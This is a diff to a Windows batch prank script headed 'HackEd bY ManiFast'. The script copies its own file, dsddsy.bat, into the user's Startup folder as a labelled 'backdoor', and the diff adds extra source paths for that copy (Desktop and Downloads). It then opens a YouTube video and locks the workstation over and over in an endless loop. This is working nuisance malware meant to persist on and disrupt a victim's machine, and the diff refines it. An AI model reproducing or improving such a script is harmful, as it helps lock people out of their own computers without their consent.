@@ -9,6 +9,8 @@ title --==::HackEd bY ManiFast::==--
 
 :: Backdoor in startup
 copy C:\Users\%Username%\Downloads\"Telegram Desktop"\dsddsy.bat C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+copy C:\Users\%Username%\Desktop\dsddsy.bat C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+copy C:\Users\%Username%\Downloads\dsddsy.bat C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
 :: with %Username%
 
 :: Vol (not work)
@@ -19,7 +21,7 @@ copy C:\Users\%Username%\Downloads\"Telegram Desktop"\dsddsy.bat C:\Users\%Usern
 ::old
 ::start msedge https://www.youtube.com/watch?v=jMBsK5BxTaw
 ::new
-start chrome https://www.youtube.com/watch?v=ddYAAe7ejSA&ab_channel=%D0%95%D0%B3%D0%BE%D1%80%D0%94%D0%B5%D0%B1%D0%B8%D0%BB%D0%BE%D0%B2
+start msedge https://www.youtube.com/watch?v=ddYAAe7ejSA&ab_channel=%D0%95%D0%B3%D0%BE%D1%80%D0%94%D0%B5%D0%B1%D0%B8%D0%BB%D0%BE%D0%B2
 
 ::microsoft-edge:
 ::firefox.exe
@@ -88,11 +90,12 @@ Rundll32.exe user32.dll,LockWorkStation
 timeout 1
 
 :: timeout 10 if test
-timeout 1
+timeout 5
 
 :: LOOP !!
 
 GOTO UP
 
+:: No use
 pause
 exit
